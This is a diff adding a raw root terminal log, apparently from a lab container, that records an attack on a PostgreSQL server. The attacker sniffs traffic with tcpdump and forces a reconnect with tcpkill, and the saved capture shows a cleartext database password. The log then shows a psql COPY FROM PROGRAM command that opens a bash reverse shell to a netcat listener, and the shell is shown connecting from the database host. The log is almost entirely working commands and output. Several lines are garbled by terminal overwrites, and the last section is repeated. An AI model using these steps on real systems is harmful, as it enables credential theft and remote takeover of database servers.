@@ -1,0 +1,265 @@
+root@10bebeaa37a7:/# netstat -ano
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+tcp        0      0 127.0.0.11:39613        0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 172.19.0.3:52900        172.19.0.2:5432         ESTABLISHED keepalive (0.64/0/0)
+udp        0      0 127.0.0.11:60948        0.0.0.0:*                           off (0.00/0/0)
+Active UNIX domain sockets (servers and established)
+Proto RefCnt Flags       Type       State         I-Node   Path
+root@10bebeaa37a7:/# 
+
+0bebeaa37a7:/# tcpdump -i eth0 host 172.19.0.2 and port 5432 -A > creds.txt
+root@10bebeaa37a7:/# tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+t & tcpkill -i eth0 host 172.19.0.2 and port 54320.2 and port 5432 -A > creds.txt
+[2] 15
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+tcpkill: listening on eth0 [host 172.19.0.2 and port 5432]
+172.19.0.3:52900 > 172.19.0.2:5432: R 2448430190:2448430190(0) win 0
+172.19.0.3:52900 > 172.19.0.2:5432: R 2448430691:2448430691(0) win 0
+172.19.0.3:52900 > 172.19.0.2:5432: R 2448431693:2448431693(0) win 0
+172.19.0.2:5432 > 172.19.0.3:52900: R 729778610:729778610(0) win 0
+172.19.0.2:5432 > 172.19.0.3:52900: R 729779119:729779119(0) win 0
+172.19.0.2:5432 > 172.19.0.3:52900: R 729780137:729780137(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864139922:2864139922(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864140424:2864140424(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864141428:2864141428(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864139922:2864139922(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864140424:2864140424(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864141428:2864141428(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455047976:1455047976(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455048485:1455048485(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455049503:1455049503(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455047976:1455047976(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455048485:1455048485(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455049503:1455049503(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864139923:2864139923(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864140425:2864140425(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864141429:2864141429(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864139923:2864139923(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864140425:2864140425(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864141429:2864141429(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455048037:1455048037(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455048546:1455048546(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455049564:1455049564(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864139932:2864139932(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864140434:2864140434(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864141438:2864141438(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455048067:1455048067(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455048576:1455048576(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455049594:1455049594(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864140339:2864140339(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864140840:2864140840(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864141842:2864141842(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455048086:1455048086(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455048595:1455048595(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455049613:1455049613(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864140428:2864140428(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864140929:2864140929(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864141931:2864141931(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864140428:2864140428(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864140929:2864140929(0) win 0
+172.19.0.3:53700 > 172.19.0.2:5432: R 2864141931:2864141931(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455048086:1455048086(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455048595:1455048595(0) win 0
+172.19.0.2:5432 > 172.19.0.3:53700: R 1455049613:1455049613(0) win 0
+^C
+root@10bebeaa37a7:/# l
+bin@                dev/   lib64@  proc/  sbin.usr-is-merged/  usr/
+bin.usr-is-merged/  etc/   media/  root/  srv/                 var/
+boot/               home/  mnt/    run/   sys/
+creds.txt           lib@   opt/    sbin@  tmp/
+root@10bebeaa37a7:/# cat creds.txt 
+15:49:27.228695 IP 10bebeaa37a7.52900 > postgres_db.user_db_network.postgresql: Flags [.], ack 2448430190, win 501, options [nop,nop,TS val 412068763 ecr 4272318338], length 0
+E..4..@................8+......n....XR.....
+......g.
+15:49:27.228764 IP postgres_db.user_db_network.postgresql > 10bebeaa37a7.52900: Flags [.], ack 1, win 509, options [nop,nop,TS val 4272323353 ecr 412063748], length 0
+E..4..@..............8.....n+.......XR.....
+..{.....
+15:49:27.356816 IP 10bebeaa37a7.52900 > postgres_db.user_db_network.postgresql: Flags [R], seq 729778610, win 0, length 0
+E..(:)..@..{...........8+.......P.......
+15:49:27.359186 IP 10bebeaa37a7.52900 > postgres_db.user_db_network.postgresql: Flags [R], seq 729779119, win 0, length 0
+E..(....@.G............8+.......P.......
+15:49:27.359217 IP 10bebeaa37a7.52900 > postgres_db.user_db_network.postgresql: Flags [R], seq 729780137, win 0, length 0
+E..(F...@..............8+.......P.......
+15:49:52.219528 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [S], seq 1455047967, win 64240, options [mss 1460,sackOK,TS val 412093753 ecr 0,nop,wscale 7], length 0
+E..<..@................8V.E.........XZ.........
+...9........
+15:49:52.219578 IP postgres_db.user_db_network.postgresql > 10bebeaa37a7.53700: Flags [S.], seq 2864139921, ack 1455047968, win 65160, options [mss 1460,sackOK,TS val 4272348343 ecr 412093753,nop,wscale 7], length 0
+E..<..@..............8....N.V.E ....XZ.........
+.......9....
+15:49:52.219589 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [.], ack 1, win 502, options [nop,nop,TS val 412093754 ecr 4272348343], length 0
+E..4..@................8V.E ..N.....XR.....
+...:....
+15:49:52.220507 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [P.], seq 1:9, ack 1, win 502, options [nop,nop,TS val 412093754 ecr 4272348343], length 8
+E..<..@................8V.E ..N.....XZ.....
+...:.........../
+15:49:52.220529 IP postgres_db.user_db_network.postgresql > 10bebeaa37a7.53700: Flags [.], ack 9, win 509, options [nop,nop,TS val 4272348344 ecr 412093754], length 0
+E..4..@....j.........8....N.V.E(....XR.....
+......:
+15:49:52.220548 IP postgres_db.user_db_network.postgresql > 10bebeaa37a7.53700: Flags [P.], seq 1:2, ack 9, win 509, options [nop,nop,TS val 4272348344 ecr 412093754], length 1
+E..5./@....h.........8....N.V.E(....XS.....
+.......:N
+15:49:52.220552 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [.], ack 2, win 502, options [nop,nop,TS val 412093754 ecr 4272348344], length 0
+E..4..@................8V.E(..N.....XR.....
+...:....
+15:49:52.220569 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [P.], seq 9:70, ack 2, win 502, options [nop,nop,TS val 412093754 ecr 4272348344], length 61
+E..q..@................8V.E(..N.....X......
+...:.......=....user.user.database.mydatabase.application_name.psql..
+15:49:52.221465 IP postgres_db.user_db_network.postgresql > 10bebeaa37a7.53700: Flags [P.], seq 2:11, ack 70, win 509, options [nop,nop,TS val 4272348345 ecr 412093754], length 9
+E..=.0@...._.........8....N.V.Ee....X[.....
+.......:R........
+15:49:52.221493 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [P.], seq 70:100, ack 11, win 502, options [nop,nop,TS val 412093755 ecr 4272348345], length 30
+E..R..@................8V.Ee..N.....Xp.....
+...;....p....SecretPostgreSQLPassword.
+15:49:52.231706 IP postgres_db.user_db_network.postgresql > 10bebeaa37a7.53700: Flags [P.], seq 11:418, ack 100, win 509, options [nop,nop,TS val 4272348356 ecr 412093755], length 407
+E....1@..............8....N.V.E.....Y......
+.......;R........S....in_hot_standby.off.S....integer_datetimes.on.S....TimeZone.UTC.S....IntervalStyle.postgres.S....is_superuser.on.S....application_name.psql.S...&default_transaction_read_only.off.S....scram_iterations.4096.S....DateStyle.ISO, MDY.S...#standard_conforming_strings.on.S....session_authorization.user.S....client_encoding.UTF8.S....server_version.16.8.S....server_encoding.UTF8.K........B...Z....I
+15:49:52.231816 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [P.], seq 100:119, ack 418, win 501, options [nop,nop,TS val 412093766 ecr 4272348356], length 19
+E..G..@................8V.E...P3....Xe.....
+...F....Q....SELECT now();.
+15:49:52.232193 IP postgres_db.user_db_network.postgresql > 10bebeaa37a7.53700: Flags [P.], seq 418:507, ack 119, win 509, options [nop,nop,TS val 4272348356 ecr 412093766], length 89
+E....2@..............8....P3V.E.....X......
+.......FT......now...................D...'......2026-04-12 15:49:52.231833+00C....SELECT 1.Z....I
+15:49:52.272655 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [.], ack 507, win 501, options [nop,nop,TS val 412093807 ecr 4272348356], length 0
+E..4..@................8V.E...P.....XR.....
+...o....
+15:49:52.380807 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [.], ack 507, win 501, options [nop,nop,TS val 412093915 ecr 4272348356], length 0
+E..4..@................8V.E...P.....XR.....
+........
+15:49:52.380852 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455047976, win 0, length 0
+E..(./..@. v...........8V.E(....P.......
+15:49:52.380861 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048485, win 0, length 0
+E..(....@.f............8V.G%....P.......
+15:49:52.380870 IP postgres_db.user_db_network.postgresql > 10bebeaa37a7.53700: Flags [.], ack 119, win 509, options [nop,nop,TS val 4272348505 ecr 412093915], length 0
+E..4.3@....e.........8....P.V.E.....XR.....
+...Y...
+15:49:52.380880 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455049503, win 0, length 0
+E..(.#..@..............8V.K.....P.......
+15:49:52.380888 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455047976, win 0, length 0
+E..(U...@..............8V.E(....P.......
+15:49:52.380895 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048485, win 0, length 0
+E..(u6..@..n...........8V.G%....P.......
+15:49:52.380906 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455049503, win 0, length 0
+E..(Mq..@..3...........8V.K.....P.......
+15:49:52.380941 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048037, win 0, length 0
+E..(Q...@..............8V.Ee....P.......
+15:49:52.380948 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048546, win 0, length 0
+E..(....@..............8V.Gb....P.......
+15:49:52.380957 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455049564, win 0, length 0
+E..(....@..............8V.K\....P.......
+15:49:52.381030 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048067, win 0, length 0
+E..(=#..@..............8V.E.....P....z..
+15:49:52.381039 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048576, win 0, length 0
+E..(k...@..............8V.G.....P....}..
+15:49:52.381046 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455049594, win 0, length 0
+E..(
+...@..............8V.Kz....P.......
+15:49:52.381069 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048086, win 0, length 0
+E..(AN..@..V...........8V.E.....P....g..
+15:49:52.381085 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048595, win 0, length 0
+E..(.,..@.vx...........8V.G.....P....j..
+15:49:52.381097 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455049613, win 0, length 0
+E..(%B..@..b...........8V.K.....P....p..
+15:49:52.929897 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048086, win 0, length 0
+E..(.B..@..c...........8V.E.....P....g..
+15:49:52.930083 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048595, win 0, length 0
+E..( j..@..;...........8V.G.....P....j..
+15:49:52.930165 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455049613, win 0, lengthP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [P.], seq 70:100, ack 11, win 502, options [nop,nop,TS val 412093755 ecr 4272348345], length 30
+E..R..@................8V.Ee..N.....Xp.....
+...;....p....SecretPostgreSQLPassword.
+15:49:52.231708 IP postgres_db.user_db_network.postgresql > 10bebeaa37a7.53700: Flags [P.], seq 11:418, ack 100, win 509, options [nop,nop,TS val 4272348356 ecr 412093755], length 407
+E....1@..............8....N.V.E.....Y......
+.......;R........S....in_hot_standby.off.S....integer_datetimes.on.S....TimeZone.UTC.S....IntervalStyle.postgres.S....is_superuser.on.S....application_name.psql.S...&default_transaction_read_only.off.S....scram_iterations.4096.S....DateStyle.ISO, MDY.S...#standard_conforming_strings.on.S....session_authorization.user.S....client_encoding.UTF8.S....server_version.16.8.S....server_encoding.UTF8.K........B...Z....I
+15:49:52.231816 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [P.], seq 100:119, ack 418, win 501, options [nop,nop,TS val 412093766 ecr 4272348356], length 19
+E..G..@................8V.E...P3....Xe.....
+...F....Q....SELECT now();.
+15:49:52.232194 IP postgres_db.user_db_network.postgresql > 10bebeaa37a7.53700: Flags [P.], seq 418:507, ack 119, win 509, options [nop,nop,TS val 4272348356 ecr 412093766], length 89
+E....2@..............8....P3V.E.....X......
+.......FT......now...................D...'......2026-04-12 15:49:52.231833+00C....SELECT 1.Z....I
+15:49:52.272657 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [.], ack 507, win 501, options [nop,nop,TS val 412093807 ecr 4272348356], length 0
+E..4..@................8V.E...P.....XR.....
+...o....
+15:49:52.380809 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [.], ack 507, win 501, options [nop,nop,TS val 412093915 ecr 4272348356], length 0
+E..4..@................8V.E...P.....XR.....
+........
+15:49:52.380853 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455047976, win 0, length 0
+E..(./..@. v...........8V.E(....P.......
+15:49:52.380861 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048485, win 0, length 0
+E..(....@.f............8V.G%....P.......
+15:49:52.380871 IP postgres_db.user_db_network.postgresql > 10bebeaa37a7.53700: Flags [.], ack 119, win 509, options [nop,nop,TS val 4272348505 ecr 412093915], length 0
+E..4.3@....e.........8....P.V.E.....XR.....
+...Y...
+15:49:52.380880 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455049503, win 0, length 0
+E..(.#..@..............8V.K.....P.......
+15:49:52.380889 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455047976, win 0, length 0
+E..(U...@..............8V.E(....P.......
+15:49:52.380895 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048485, win 0, length 0
+E..(u6..@..n...........8V.G%....P.......
+15:49:52.380906 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455049503, win 0, length 0
+E..(Mq..@..3...........8V.K.....P.......
+15:49:52.380942 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048037, win 0, length 0
+E..(Q...@..............8V.Ee....P.......
+15:49:52.380948 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048546, win 0, length 0
+E..(....@..............8V.Gb....P.......
+15:49:52.380957 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455049564, win 0, length 0
+E..(....@..............8V.K\....P.......
+15:49:52.381030 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048067, win 0, length 0
+E..(=#..@..............8V.E.....P....z..
+15:49:52.381040 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455048576, win 0, length 0
+E..(k...@..............8V.G.....P....}..
+15:49:52.381047 IP 10bebeaa37a7.53700 > postgres_db.user_db_network.postgresql: Flags [R], seq 1455049594, win 0, length 0
+E..(
+
+root@10bebeaa37a7:/# kill %1 %2
+root@10bebeaa37a7:/# 85 packets captured
+85 packets received by filter
+0 packets dropped by kernel
+64 packets captured
+64 packets received by filter
+0 packets dropped by kernel
+
+[1]-  Done                    tcpdump -i eth0 host 172.19.0.2 and port 5432 -A > creds.txt
+[2]+  Done                    tcpdump -i eth0 host 172.19.0.2 and port 5432 -A > creds.txt
+
+root@10bebeaa37a7:/# nc -lvnp 4444 &
+[1] 36
+root@10bebeaa37a7:/# Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Listening on [::]:4444
+Ncat: Listening on 0.0.0.0:4444
+
+root@10bebeaa37a7:/# psql -h 172.19.0.2 -U user -d mydatabase
+Password for user user: 
+psql (16.9 (Ubuntu 16.9-0ubuntu0.24.04.1), server 16.8)
+Type "help" for help.
+mydatabase=# DROP TABLE IF EXISTS cmd_exec;
+COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/172.19.0.3/4444 0>&1"';
+NOTICE:  table "cmd_exec" does not exist, skippingev/tcp/172.19.0.3/4444 0>&1"'; 
+DROP TABLExec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/172.19.0.3/4444 0>&1"'; 
+CREATE TABLE
+Ncat: Connection from 172.19.0.2:45078.
+bash: cannot set terminal process group (646): Not a tty
+bash: no job control in this shell
+032c93ff87db:~/data$ 
+
+
+root@10bebeaa37a7:/# nc -lvnp 4444 &
+[1] 36
+root@10bebeaa37a7:/# Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Listening on [::]:4444
+Ncat: Listening on 0.0.0.0:4444
+
+root@10bebeaa37a7:/# psql -h 172.19.0.2 -U user -d mydatabase
+Password for user user: 
+psql (16.9 (Ubuntu 16.9-0ubuntu0.24.04.1), server 16.8)
+Type "help" for help.
+mydatabase=# DROP TABLE IF EXISTS cmd_exec;
+COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/172.19.0.3/4444 0>&1"';
+NOTICE:  table "cmd_exec" does not exist, skippingev/tcp/172.19.0.3/4444 0>&1"'; 
+DROP TABLExec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/172.19.0.3/4444 0>&1"'; 
+CREATE TABLE
+Ncat: Connection from 172.19.0.2:45078.
+bash: cannot set terminal process group (646): Not a tty
+bash: no job control in this shell
+032c93ff87db:~/data$ 
